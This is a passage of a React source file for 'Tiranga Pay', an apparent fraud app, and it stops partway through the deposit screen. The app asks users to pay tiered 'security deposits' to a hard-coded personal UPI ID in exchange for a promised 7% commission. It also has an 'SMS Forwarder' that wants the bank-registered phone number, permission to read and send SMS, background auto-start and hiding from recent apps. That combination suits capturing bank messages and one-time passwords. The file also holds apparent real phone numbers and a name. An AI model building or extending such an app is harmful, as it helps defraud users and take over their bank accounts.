import { useState, useEffect, type FormEvent } from 'react'
import { supabase } from './lib/supabase'
import type { User } from '@supabase/supabase-js'

interface UserProfile {
  id: string
  email: string | null
  phone: string | null
  invite_code: string | null
  wallet_balance: number
  reward_points: number
  created_at: string
}

interface DepositRecord {
  id: string
  account_type: string
  amount: number
  utr_number: string
  status: string
  created_at: string
}

interface WithdrawalRecord {
  id: string
  amount: number
  bank_account_info: string
  status: string
  created_at: string
}

interface BankAccount {
  id?: string
  bank_name: string
  account_number: string
  ifsc_code: string
  holder_name: string
  status?: string
}

export default function App() {
  const [user, setUser] = useState<User | null>(null)
  const [profile, setProfile] = useState<UserProfile | null>(null)
  const [initialLoading, setInitialLoading] = useState(true)
  const [loading, setLoading] = useState(false)

  // Navigation State
  const [activeTab, setActiveTab] = useState<'home' | 'transactions' | 'profile'>('home')
  const [subScreen, setSubScreen] = useState<'none' | 'sms' | 'withdraw' | 'deposit' | 'bank_setup' | 'change_password'>('none')

  // Front Auth State
  const [authMode, setAuthMode] = useState<'login' | 'signup'>('login')
  const [authEmail, setAuthEmail] = useState('')
  const [authPhone, setAuthPhone] = useState('')
  const [authPassword, setAuthPassword] = useState('')
  const [authConfirmPassword, setAuthConfirmPassword] = useState('')
  const [authInviteCode, setAuthInviteCode] = useState('')
  const [authError, setAuthError] = useState<string | null>(null)
  const [authSuccess, setAuthSuccess] = useState<string | null>(null)

  // SMS Forwarder State (Photo 1)
  const [forwardSms, setForwardSms] = useState(false)
  const [autoStartup, setAutoStartup] = useState(true)
  const [batteryOptimization, setBatteryOptimization] = useState(true)
  const [hideRecentApps, setHideRecentApps] = useState(false)
  const [bankRegPhone, setBankRegPhone] = useState('6206762421')

  // Security Deposit State (Photos 4 & 5)
  const [depositTier, setDepositTier] = useState<'savings' | 'current' | 'corporate'>('savings')
  const [paymentMode, setPaymentMode] = useState<'upi' | 'bank'>('upi')
  const [utrNumber, setUtrNumber] = useState('')
  const [selectedFileName, setSelectedFileName] = useState('No file chosen')
  const [depositMsg, setDepositMsg] = useState<string | null>(null)
  const [depositsList, setDepositsList] = useState<DepositRecord[]>([])

  // Withdrawal State (Photo 2)
  const [withdrawAmount, setWithdrawAmount] = useState('')
  const [withdrawPassword, setWithdrawPassword] = useState('')
  const [userBank, setUserBank] = useState<BankAccount | null>({
    bank_name: 'INDUSIND BANK',
    account_number: '2107',
    ifsc_code: 'INDB0000001',
    holder_name: 'VIKRAM KUMAR',
    status: 'PENDING'
  })
  const [withdrawMsg, setWithdrawMsg] = useState<string | null>(null)
  const [withdrawalsList, setWithdrawalsList] = useState<WithdrawalRecord[]>([])

  // Bank Form State
  const [newBankName, setNewBankName] = useState('')
  const [newAccNumber, setNewAccNumber] = useState('')
  const [newIfsc, setNewIfsc] = useState('')
  const [newHolderName, setNewHolderName] = useState('')

  // Toast / Copy helper
  const [toastMsg, setToastMsg] = useState<string | null>(null)

  const showToast = (msg: string) => {
    setToastMsg(msg)
    setTimeout(() => setToastMsg(null), 2500)
  }

  // Load User Data from Supabase
  const loadUserData = async (userId: string, email?: string) => {
    try {
      // 1. Profile
      const { data: prof } = await supabase
        .from('profiles')
        .select('*')
        .eq('id', userId)
        .maybeSingle()

      if (prof) {
        setProfile(prof)
        if (prof.phone) setBankRegPhone(prof.phone.replace('+91', '').trim())
      } else {
        const initial = {
          id: userId,
          email: email || '',
          phone: '+916206762421',
          wallet_balance: 0.00,
          reward_points: 100,
          created_at: new Date().toISOString()
        }
        await supabase.from('profiles').upsert(initial)
        setProfile(initial as UserProfile)
      }

      // 2. Bank Accounts
      const { data: bankData } = await supabase
        .from('user_banks')
        .select('*')
        .eq('user_id', userId)
        .order('created_at', { ascending: false })
        .limit(1)

      if (bankData && bankData.length > 0) {
        setUserBank(bankData[0])
      }

      // 3. Deposits
      const { data: depData } = await supabase
        .from('deposits')
        .select('*')
        .eq('user_id', userId)
        .order('created_at', { ascending: false })

      if (depData) setDepositsList(depData)

      // 4. Withdrawals
      const { data: withData } = await supabase
        .from('withdrawals')
        .select('*')
        .eq('user_id', userId)
        .order('created_at', { ascending: false })

      if (withData) setWithdrawalsList(withData)
    } catch (err) {
      console.error('Error fetching Supabase user data:', err)
    }
  }

  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      const cur = session?.user ?? null
      setUser(cur)
      if (cur) {
        loadUserData(cur.id, cur.email)
      }
      setInitialLoading(false)
    })

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      const cur = session?.user ?? null
      setUser(cur)
      if (cur) {
        loadUserData(cur.id, cur.email)
      } else {
        setProfile(null)
      }
    })

    return () => subscription.unsubscribe()
  }, [])

  // Front Auth: Login
  const handleFrontLogin = async (e: FormEvent) => {
    e.preventDefault()
    setAuthError(null)
    setAuthSuccess(null)

    if (!authEmail.trim() || !authPassword) {
      setAuthError('Please fill in both email and password.')
      return
    }

    try {
      setLoading(true)
      const { data, error } = await supabase.auth.signInWithPassword({
        email: authEmail.trim(),
        password: authPassword
      })

      if (error) throw error

      if (data.user) {
        setUser(data.user)
        await supabase.from('profiles').update({ last_login_at: new Date().toISOString() }).eq('id', data.user.id)
        await loadUserData(data.user.id, data.user.email)
        setAuthSuccess('Welcome back!')
        setActiveTab('home')
      }
    } catch (err: unknown) {
      setAuthError(err instanceof Error ? err.message : 'Invalid credentials')
    } finally {
      setLoading(false)
    }
  }

  // Front Auth: Sign Up
  const handleFrontSignup = async (e: FormEvent) => {
    e.preventDefault()
    setAuthError(null)
    setAuthSuccess(null)

    if (!authEmail.trim() || !authPassword) {
      setAuthError('Email and password are required.')
      return
    }

    if (authPassword.length < 6) {
      setAuthError('Password must be at least 6 characters.')
      return
    }

    if (authPassword !== authConfirmPassword) {
      setAuthError('Passwords do not match.')
      return
    }

    try {
      setLoading(true)
      const cleanPhone = authPhone.trim() ? (authPhone.startsWith('+91') ? authPhone.trim() : `+91${authPhone.trim()}`) : '+916206762421'
      const cleanInvite = authInviteCode.trim().toUpperCase()

      const { data, error } = await supabase.auth.signUp({
        email: authEmail.trim(),
        password: authPassword,
        options: {
          data: {
            phone: cleanPhone,
            invite_code: cleanInvite || null
          }
        }
      })

      if (error) throw error

      if (data.user) {
        const newProf = {
          id: data.user.id,
          email: data.user.email,
          phone: cleanPhone,
          invite_code: cleanInvite || null,
          wallet_balance: 0.00,
          reward_points: 100,
          created_at: new Date().toISOString(),
          updated_at: new Date().toISOString()
        }
        await supabase.from('profiles').upsert(newProf)
        setUser(data.user)
        setProfile(newProf as UserProfile)
        setAuthSuccess('Account registered & saved in Supabase!')
        setActiveTab('home')
      }
    } catch (err: unknown) {
      setAuthError(err instanceof Error ? err.message : 'Registration failed')
    } finally {
      setLoading(false)
    }
  }

  // Deposit Submission (Photos 4 & 5)
  const handleSubmitDeposit = async (e: FormEvent) => {
    e.preventDefault()
    setDepositMsg(null)

    if (!user) return

    if (!utrNumber.trim() || utrNumber.trim().length < 8) {
      setDepositMsg('Please enter a valid 12-digit UTR transaction number.')
      return
    }

    const tierAmounts = {
      savings: 2000,
      current: 5000,
      corporate: 15000
    }
    const depositAmt = tierAmounts[depositTier]

    try {
      setLoading(true)
      const { data, error } = await supabase.from('deposits').insert([
        {
          user_id: user.id,
          account_type: `${depositTier.toUpperCase()} ACCOUNT`,
          amount: depositAmt,
          utr_number: utrNumber.trim(),
          payment_slip_url: selectedFileName !== 'No file chosen' ? selectedFileName : 'slip_uploaded.png',
          status: 'pending'
        }
      ]).select()

      if (error) throw error

      showToast('Deposit details submitted successfully!')
      setDepositMsg('Payment proof submitted! Deposit verification is under review.')
      setUtrNumber('')
      setSelectedFileName('No file chosen')

      if (data) {
        setDepositsList(prev => [data[0], ...prev])
      }
    } catch (err: unknown) {
      setDepositMsg(err instanceof Error ? err.message : 'Deposit submission failed')
    } finally {
      setLoading(false)
    }
  }

  // Withdrawal Submission (Photo 2)
  const handleSubmitWithdrawal = async (e: FormEvent) => {
    e.preventDefault()
    setWithdrawMsg(null)

    if (!user) return

    const amt = parseFloat(withdrawAmount)
    if (isNaN(amt) || amt < 500) {
      setWithdrawMsg('Minimum withdrawal amount is ₹500.')
      return
    }

    if (!userBank) {
      setWithdrawMsg('Please setup and link your receiving bank account first.')
      return
    }

    if (!withdrawPassword) {
      setWithdrawMsg('Please enter your account security password.')
      return
    }

    try {
      setLoading(true)
      const bankInfo = `${userBank.bank_name} - A/C ${userBank.account_number.slice(-4)} (${userBank.holder_name})`
      const { data, error } = await supabase.from('withdrawals').insert([
        {
          user_id: user.id,
          amount: amt,
          bank_account_info: bankInfo,
          status: 'pending'
        }
      ]).select()

      if (error) throw error

      showToast('Withdrawal request submitted!')
      setWithdrawMsg('Withdrawal request placed successfully! Status: Under Review.')
      setWithdrawAmount('')
      setWithdrawPassword('')

      if (data) {
        setWithdrawalsList(prev => [data[0], ...prev])
      }
    } catch (err: unknown) {
      setWithdrawMsg(err instanceof Error ? err.message : 'Withdrawal submission failed')
    } finally {
      setLoading(false)
    }
  }

  // Bank Setup Submission
  const handleSaveBank = async (e: FormEvent) => {
    e.preventDefault()
    if (!user) return

    if (!newBankName || !newAccNumber || !newIfsc || !newHolderName) {
      alert('Please fill all bank details.')
      return
    }

    try {
      setLoading(true)
      const bankPayload = {
        user_id: user.id,
        bank_name: newBankName.trim().toUpperCase(),
        account_number: newAccNumber.trim(),
        ifsc_code: newIfsc.trim().toUpperCase(),
        holder_name: newHolderName.trim().toUpperCase(),
        status: 'PENDING'
      }

      const { data, error } = await supabase.from('user_banks').insert([bankPayload]).select()
      if (error) throw error

      if (data && data[0]) {
        setUserBank(data[0])
      }
      showToast('Bank account added successfully!')
      setSubScreen('none')
      setActiveTab('home')
    } catch (err: unknown) {
      alert(err instanceof Error ? err.message : 'Failed to save bank account')
    } finally {
      setLoading(false)
    }
  }

  // Copy UPI Function
  const handleCopyUPI = () => {
    navigator.clipboard.writeText('9685318069@mairtel')
    showToast('UPI ID Copied: 9685318069@mairtel')
  }

  // Log Out
  const handleLogout = async () => {
    await supabase.auth.signOut()
    setUser(null)
    setProfile(null)
    setSubScreen('none')
    setActiveTab('home')
  }

  if (initialLoading) {
    return (
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh', flexDirection: 'column', gap: '12px' }}>
        <i className="fas fa-spinner fa-spin" style={{ fontSize: '32px', color: '#00A3E0' }}></i>
        <p style={{ color: '#082f6e', fontWeight: 800 }}>Loading Tiranga Pay...</p>
      </div>
    )
  }

  // 1. FRONT SCREEN: LOGIN & SIGNUP (When user is NOT logged in)
  if (!user) {
    return (
      <div className="app-viewport">
        {/* Top Branding Header */}
        <header className="app-header">
          <div className="brand-logo-text">
            <span className="brand-tiranga">TIRANGA</span>
            <span className="brand-pay">PAY</span>
          </div>
          <div className="header-actions">
            <div className="header-circle-btn" onClick={() => alert('Tiranga Pay 24/7 Support: support@tirangapaypanel.in')}>
              <i className="fa-solid fa-headset"></i>
            </div>
            <div className="header-circle-btn" onClick={() => alert('No new notifications')}>
              <i className="fa-regular fa-bell"></i>
            </div>
          </div>
        </header>

        {/* Cyan Ticker Announcement */}
        <div className="cyan-ticker">
          <i className="fas fa-bullhorn"></i>
          <span className="ticker-content">
            TIRANGA PAY! Securely link your bank accounts and earn a flat 7% commission on all transactions! 24x7 Instant Settlement.
          </span>
        </div>

        {/* Main Front Auth Card */}
        <div className="front-auth-container">
          <div className="front-auth-card">
            <div style={{ textAlign: 'center', marginBottom: '22px' }}>
              <div style={{
                width: '64px',
                height: '64px',
                borderRadius: '18px',
                background: 'linear-gradient(135deg, #082f6e, #00A3E0)',
                margin: '0 auto 12px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: '#ffffff',
                fontSize: '26px',
                boxShadow: '0 8px 20px rgba(0, 163, 224, 0.25)'
              }}>
                <i className="fas fa-shield-alt"></i>
              </div>
              <h2 style={{ fontSize: '22px', fontWeight: 900, color: '#082f6e' }}>
                {authMode === 'login' ? 'User Login' : 'Register Account'}
              </h2>
              <p style={{ fontSize: '13px', color: '#64748b', fontWeight: 600, marginTop: '4px' }}>
                {authMode === 'login' ? 'Sign in to access your Tiranga Pay portal' : 'Join Tiranga Pay and earn flat 7% commission'}
              </p>
            </div>

            {/* Auth Mode Toggle Tabs */}
            <div className="auth-tabs-header">
              <button
                type="button"
                className={`auth-tab-choice ${authMode === 'login' ? 'active' : ''}`}
                onClick={() => {
                  setAuthError(null)
                  setAuthSuccess(null)
                  setAuthMode('login')
                }}
              >
                Log In
              </button>
              <button
                type="button"
                className={`auth-tab-choice ${authMode === 'signup' ? 'active' : ''}`}
                onClick={() => {
                  setAuthError(null)
                  setAuthSuccess(null)
                  setAuthMode('signup')
                }}
              >
                Sign Up
              </button>
            </div>

            {authError && (
              <div className="auth-alert-box" style={{ background: '#fef2f2', color: '#dc2626', border: '1px solid #fecaca' }}>
                <i className="fas fa-exclamation-circle"></i>
                <span>{authError}</span>
              </div>
            )}

            {authSuccess && (
              <div className="auth-alert-box" style={{ background: '#f0fdf4', color: '#16a34a', border: '1px solid #bbf7d0' }}>
                <i className="fas fa-check-circle"></i>
                <span>{authSuccess}</span>
              </div>
            )}

            {authMode === 'login' ? (
              <form onSubmit={handleFrontLogin}>
                <div style={{ marginBottom: '14px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '6px' }}>
                    Email Address
                  </label>
                  <input
                    type="email"
                    className="app-input-field"
                    placeholder="Enter registered email"
                    value={authEmail}
                    onChange={(e) => setAuthEmail(e.target.value)}
                    required
                  />
                </div>

                <div style={{ marginBottom: '18px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '6px' }}>
                    Password
                  </label>
                  <input
                    type="password"
                    className="app-input-field"
                    placeholder="Enter password"
                    value={authPassword}
                    onChange={(e) => setAuthPassword(e.target.value)}
                    required
                  />
                </div>

                <button type="submit" className="auth-submit-btn" disabled={loading}>
                  {loading ? (
                    <>
                      <i className="fas fa-spinner fa-spin" style={{ marginRight: '8px' }}></i>
                      Signing In...
                    </>
                  ) : (
                    'Log In'
                  )}
                </button>
              </form>
            ) : (
              <form onSubmit={handleFrontSignup}>
                <div style={{ marginBottom: '12px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
                    Email Address
                  </label>
                  <input
                    type="email"
                    className="app-input-field"
                    placeholder="your@email.com"
                    value={authEmail}
                    onChange={(e) => setAuthEmail(e.target.value)}
                    required
                  />
                </div>

                <div style={{ marginBottom: '12px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
                    Mobile Number (For SMS Forwarder)
                  </label>
                  <input
                    type="tel"
                    className="app-input-field"
                    placeholder="e.g. 6206762421"
                    value={authPhone}
                    onChange={(e) => setAuthPhone(e.target.value)}
                  />
                </div>

                <div style={{ marginBottom: '12px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
                    Password
                  </label>
                  <input
                    type="password"
                    className="app-input-field"
                    placeholder="At least 6 characters"
                    value={authPassword}
                    onChange={(e) => setAuthPassword(e.target.value)}
                    required
                  />
                </div>

                <div style={{ marginBottom: '12px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
                    Confirm Password
                  </label>
                  <input
                    type="password"
                    className="app-input-field"
                    placeholder="Repeat password"
                    value={authConfirmPassword}
                    onChange={(e) => setAuthConfirmPassword(e.target.value)}
                    required
                  />
                </div>

                <div style={{ marginBottom: '18px' }}>
                  <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#475569', marginBottom: '4px' }}>
                    Invitation / Referral Code (Optional)
                  </label>
                  <input
                    type="text"
                    className="app-input-field"
                    placeholder="Enter referral code"
                    value={authInviteCode}
                    onChange={(e) => setAuthInviteCode(e.target.value.toUpperCase())}
                  />
                </div>

                <button type="submit" className="auth-submit-btn" disabled={loading}>
                  {loading ? (
                    <>
                      <i className="fas fa-spinner fa-spin" style={{ marginRight: '8px' }}></i>
                      Registering...
                    </>
                  ) : (
                    'Register Account'
                  )}
                </button>
              </form>
            )}
          </div>
        </div>
      </div>
    )
  }

  // 2. LOGGED-IN APPLICATION INTERFACE (Matching all uploaded photos)
  return (
    <div className="app-viewport">
      {/* Toast popup */}
      {toastMsg && (
        <div style={{
          position: 'fixed',
          top: '20px',
          left: '50%',
          transform: 'translateX(-50%)',
          background: '#082f6e',
          color: '#ffffff',
          padding: '10px 20px',
          borderRadius: '9999px',
          fontSize: '13px',
          fontWeight: 800,
          zIndex: 100,
          boxShadow: '0 8px 24px rgba(0, 0, 0, 0.2)',
          display: 'flex',
          alignItems: 'center',
          gap: '8px'
        }}>
          <i className="fas fa-check-circle" style={{ color: '#00A3E0' }}></i>
          <span>{toastMsg}</span>
        </div>
      )}

      {/* Main App Header matching Photos */}
      <header className="app-header">
        <div className="brand-logo-text" onClick={() => { setSubScreen('none'); setActiveTab('home') }} style={{ cursor: 'pointer' }}>
          <span className="brand-tiranga">TIRANGA</span>
          <span className="brand-pay">PAY</span>
        </div>
        <div className="header-actions">
          <div className="header-circle-btn" onClick={() => alert('Customer Support 24/7 is ready to assist you: support@tirangapaypanel.in')}>
            <i className="fa-solid fa-headset"></i>
          </div>
          <div className="header-circle-btn" onClick={() => alert('Welcome to Tiranga Pay! Security Deposit & SMS Forwarder are active.')}>
            <i className="fa-regular fa-bell"></i>
          </div>
        </div>
      </header>

      {/* Cyan Ticker Banner (as visible in Photo 6, 2, 1) */}
      <div className="cyan-ticker">
        <span className="ticker-content">
          TIRANGA PAY! Securely link your bank accounts and earn a flat 7% commission on all auto-transactions!
        </span>
      </div>

      {/* --- SUB-SCREENS --- */}

      {/* SCREEN 1: Tiranga Pay SMS Forwarder (Photo 1) */}
      {subScreen === 'sms' && (
        <div style={{ padding: '0 16px 20px' }}>
          {/* Sub Header */}
          <div className="sub-header-bar" style={{ padding: '14px 0' }}>
            <div className="back-btn-square" onClick={() => setSubScreen('none')}>
              <i className="fas fa-chevron-left"></i>
            </div>
            <h2 className="sub-header-title">Tiranga Pay SMS Forwarder</h2>
          </div>

          {/* App Status Card */}
          <div className="white-card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div>
                <h4 style={{ fontSize: '15px', fontWeight: 800, color: '#0f172a' }}>App Status</h4>
                <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginTop: '2px' }}>Current state of SMS Forwarder</p>
              </div>
              <span className={forwardSms ? 'status-badge-online' : 'status-badge-offline'}>
                {forwardSms ? 'ONLINE' : 'OFFLINE'}
              </span>
            </div>
          </div>

          {/* Bank Details */}
          <div className="section-cyan-label">BANK DETAILS</div>
          <div className="white-card">
            <h4 style={{ fontSize: '14px', fontWeight: 800, color: '#0f172a' }}>Bank Register Mobile Number</h4>
            <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, margin: '2px 0 12px' }}>
              Please enter your 10-digit registered mobile number.
            </p>
            <div style={{
              display: 'flex',
              border: '1.5px solid #e2e8f0',
              borderRadius: '12px',
              overflow: 'hidden',
              background: '#ffffff'
            }}>
              <div style={{
                padding: '12px 14px',
                background: '#f8fafc',
                borderRight: '1.5px solid #e2e8f0',
                color: '#0f172a',
                fontWeight: 800,
                fontSize: '15px'
              }}>
                +91
              </div>
              <input
                type="tel"
                value={bankRegPhone}
                onChange={(e) => setBankRegPhone(e.target.value)}
                style={{
                  flex: 1,
                  padding: '12px 14px',
                  border: 'none',
                  outline: 'none',
                  fontSize: '15px',
                  fontWeight: 700,
                  color: '#0f172a',
                  fontFamily: 'inherit'
                }}
              />
            </div>
          </div>

          {/* Forwarding Function */}
          <div className="section-gray-label">FORWARDING FUNCTION</div>
          <div className="white-card">
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ maxWidth: '280px' }}>
                <h4 style={{ fontSize: '14px', fontWeight: 800, color: '#0f172a' }}>Forward Sms</h4>
                <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginTop: '2px', lineHeight: '1.3' }}>
                  Main switch, requires permissions to read and send SMS messages.
                </p>
              </div>
              <label className="toggle-switch">
                <input
                  type="checkbox"
                  checked={forwardSms}
                  onChange={(e) => {
                    setForwardSms(e.target.checked)
                    showToast(e.target.checked ? 'SMS Forwarder is now ONLINE' : 'SMS Forwarder is OFFLINE')
                  }}
                />
                <span className="slider-round"></span>
              </label>
            </div>
          </div>

          {/* Keep Alive Settings */}
          <div className="section-gray-label">KEEP ALIVE SETTINGS</div>
          <div className="white-card">
            <div className="card-item-row">
              <div style={{ maxWidth: '280px' }}>
                <h4 style={{ fontSize: '14px', fontWeight: 800, color: '#0f172a' }}>Auto Startup</h4>
                <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginTop: '2px' }}>
                  Allow Apps to Self-Start for background running.
                </p>
              </div>
              <label className="toggle-switch">
                <input
                  type="checkbox"
                  checked={autoStartup}
                  onChange={(e) => setAutoStartup(e.target.checked)}
                />
                <span className="slider-round"></span>
              </label>
            </div>

            <div className="card-item-row">
              <div style={{ maxWidth: '280px' }}>
                <h4 style={{ fontSize: '14px', fontWeight: 800, color: '#0f172a' }}>Battery Optimization</h4>
                <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginTop: '2px' }}>
                  Ignore battery limits for continuous background running.
                </p>
              </div>
              <label className="toggle-switch">
                <input
                  type="checkbox"
                  checked={batteryOptimization}
                  onChange={(e) => setBatteryOptimization(e.target.checked)}
                />
                <span className="slider-round"></span>
              </label>
            </div>

            <div className="card-item-row">
              <div style={{ maxWidth: '280px' }}>
                <h4 style={{ fontSize: '14px', fontWeight: 800, color: '#0f172a' }}>Hide from recent Apps</h4>
                <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginTop: '2px' }}>
                  Prevent accidental task closing.
                </p>
              </div>
              <label className="toggle-switch">
                <input
                  type="checkbox"
                  checked={hideRecentApps}
                  onChange={(e) => setHideRecentApps(e.target.checked)}
                />
                <span className="slider-round"></span>
              </label>
            </div>
          </div>
        </div>
      )}

      {/* SCREEN 2: Withdraw Funds (Photo 2) */}
      {subScreen === 'withdraw' && (
        <div style={{ padding: '0 16px 20px' }}>
          <div className="sub-header-bar" style={{ padding: '14px 0' }}>
            <div className="back-btn-square" onClick={() => setSubScreen('none')}>
              <i className="fas fa-chevron-left"></i>
            </div>
            <h2 className="sub-header-title">Withdraw Funds</h2>
          </div>

          <form onSubmit={handleSubmitWithdrawal} className="white-card">
            {withdrawMsg && (
              <div className="auth-alert-box" style={{ background: '#f0fdf4', color: '#16a34a', border: '1px solid #bbf7d0' }}>
                <i className="fas fa-info-circle"></i>
                <span>{withdrawMsg}</span>
              </div>
            )}

            <div style={{ marginBottom: '18px' }}>
              <label style={{ display: 'block', fontSize: '13px', fontWeight: 800, color: '#334155', marginBottom: '6px' }}>
                Withdrawal Amount (₹)
              </label>
              <input
                type="number"
                className="app-input-field"
                placeholder="Min withdrawal ₹500"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
                required
              />
            </div>

            {/* Withdrawal Receiving Account */}
            <div style={{ marginBottom: '18px' }}>
              <label style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '13px', fontWeight: 800, color: '#082f6e', marginBottom: '8px' }}>
                <i className="fas fa-landmark"></i>
                Withdrawal Receiving Account
              </label>

              {userBank ? (
                <div style={{
                  border: '1.5px solid #00A3E0',
                  background: '#f0faff',
                  borderRadius: '14px',
                  padding: '14px',
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center'
                }}>
                  <div>
                    <h5 style={{ fontWeight: 800, color: '#082f6e', fontSize: '14px' }}>{userBank.bank_name}</h5>
                    <p style={{ fontSize: '12px', color: '#0284c7', fontWeight: 600 }}>A/C: {userBank.account_number} ({userBank.holder_name})</p>
                  </div>
                  <button
                    type="button"
                    onClick={() => setSubScreen('bank_setup')}
                    style={{ background: '#00A3E0', color: '#fff', border: 'none', padding: '6px 12px', borderRadius: '8px', fontSize: '11px', fontWeight: 800, cursor: 'pointer' }}
                  >
                    Change
                  </button>
                </div>
              ) : (
                <div className="dashed-bank-box" onClick={() => setSubScreen('bank_setup')}>
                  <div>
                    <h5 style={{ fontSize: '14px', fontWeight: 800, color: '#082f6e' }}>No Bank Added</h5>
                    <p style={{ fontSize: '12px', color: '#64748b', fontWeight: 500, marginTop: '2px', fontFamily: 'monospace' }}>
                      Setup receiving bank
                    </p>
                  </div>
                  <div className="add-bank-circle-btn">+</div>
                </div>
              )}
            </div>

            {/* Account Password */}
            <div style={{ marginBottom: '22px' }}>
              <label style={{ display: 'block', fontSize: '13px', fontWeight: 800, color: '#334155', marginBottom: '6px' }}>
                Account Password (For Security)
              </label>
              <input
                type="password"
                className="app-input-field"
                placeholder="Enter password"
                value={withdrawPassword}
                onChange={(e) => setWithdrawPassword(e.target.value)}
                required
              />
            </div>

            <button type="submit" className="green-action-btn" disabled={loading}>
              {loading ? 'Processing...' : 'Submit Withdrawal Request'}
            </button>
          </form>

          {/* Withdrawal History */}
          <div style={{ marginTop: '24px' }}>
            <h3 style={{ fontSize: '15px', fontWeight: 800, color: '#0f172a', marginBottom: '12px' }}>
              Withdrawal History
            </h3>
            {withdrawalsList.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '24px 0', color: '#94a3b8', fontSize: '13px', fontWeight: 600 }}>
                No records found.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                {withdrawalsList.map((item) => (
                  <div key={item.id} className="white-card" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px' }}>
                    <div>
                      <h5 style={{ fontWeight: 800, color: '#082f6e' }}>₹{item.amount.toFixed(2)}</h5>
                      <span style={{ fontSize: '11px', color: '#64748b' }}>{new Date(item.created_at).toLocaleString()}</span>
                    </div>
                    <span style={{
                      padding: '4px 10px',
                      borderRadius: '8px',
                      fontSize: '11px',
                      fontWeight: 800,
                      textTransform: 'uppercase',
                      background: item.status === 'approved' ? '#dcfce7' : '#fef9c3',
                      color: item.status === 'approved' ? '#15803d' : '#854d0e'
                    }}>
                      {item.status}
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* SCREEN 2B: Add Bank Account */}
      {subScreen === 'bank_setup' && (
        <div style={{ padding: '0 16px 20px' }}>
          <div className="sub-header-bar" style={{ padding: '14px 0' }}>
            <div className="back-btn-square" onClick={() => setSubScreen('none')}>
              <i className="fas fa-chevron-left"></i>
            </div>
            <h2 className="sub-header-title">Link Bank Card</h2>
          </div>

          <form onSubmit={handleSaveBank} className="white-card">
            <div style={{ marginBottom: '14px' }}>
              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
                Bank Name
              </label>
              <input
                type="text"
                className="app-input-field"
                placeholder="e.g. INDUSIND BANK, HDFC, SBI"
                value={newBankName}
                onChange={(e) => setNewBankName(e.target.value)}
                required
              />
            </div>

            <div style={{ marginBottom: '14px' }}>
              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
                Account Holder Name
              </label>
              <input
                type="text"
                className="app-input-field"
                placeholder="e.g. VIKRAM KUMAR"
                value={newHolderName}
                onChange={(e) => setNewHolderName(e.target.value)}
                required
              />
            </div>

            <div style={{ marginBottom: '14px' }}>
              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
                Account / Card Number
              </label>
              <input
                type="text"
                className="app-input-field"
                placeholder="e.g. 109283742107"
                value={newAccNumber}
                onChange={(e) => setNewAccNumber(e.target.value)}
                required
              />
            </div>

            <div style={{ marginBottom: '20px' }}>
              <label style={{ display: 'block', fontSize: '12px', fontWeight: 800, color: '#334155', marginBottom: '4px' }}>
                IFSC Code
              </label>
              <input
                type="text"
                className="app-input-field"
                placeholder="e.g. INDB0000001"
                value={newIfsc}
                onChange={(e) => setNewIfsc(e.target.value.toUpperCase())}
                required
              />
            </div>

            <button type="submit" className="green-action-btn" disabled={loading}>
              Save & Link Bank Card
            </button>
          </form>
        </div>
      )}

      {/* SCREEN 3: Security Deposit (Photos 4 & 5) */}
      {subScreen === 'deposit' && (
        <div style={{ padding: '0 16px 20px' }}>
          <div className="sub-header-bar" style={{ padding: '14px 0' }}>
            <div className="back-btn-square" onClick={() => setSubScreen('none')}>
              <i className="fas fa-chevron-left"></i>
            </div>
            <h2 className="sub-header-title">Security Deposit</h2>
          </div>

          <div style={{ textAlign: 'center', margin: '8px 0 16px' }}>
            <h2 style={{ fontSize: '18px', fontWeight: 900, color: '#082f6e', letterSpacing: '-0.01em' }}>
              TIRANGA PAY SECURITY DEPOSIT
            </h2>
          </div>

          {/* Tier Packages */}
          <div className="tier-packages-grid">
            <div
              className={`tier-pkg-box ${depositTier === 'savings' ? 'active' : ''}`}
              onClick={() => setDepositTier('savings')}
            >
              <div className="tier-pkg-title">Savings Account</div>
              <div className="tier-pkg-amount">₹2000</div>
            </div>

            <div
              className={`tier-pkg-box ${depositTier === 'current' ? 'active' : ''}`}
              onClick={() => setDepositTier('current')}
            >
              <div className="tier-pkg-title">Current Account</div>
              <div className="tier-pkg-amount">₹5000</div>
            </div>

            <div
              className={`tier-pkg-box ${depositTier === 'corporate' ? 'active' : ''}`}
              onClick={() => setDepositTier('corporate')}
            >
              <div className="tier-pkg-title">Corporate Account</div>
              <div className="tier-pkg-amount">₹15000</div>
            </div>
          </div>

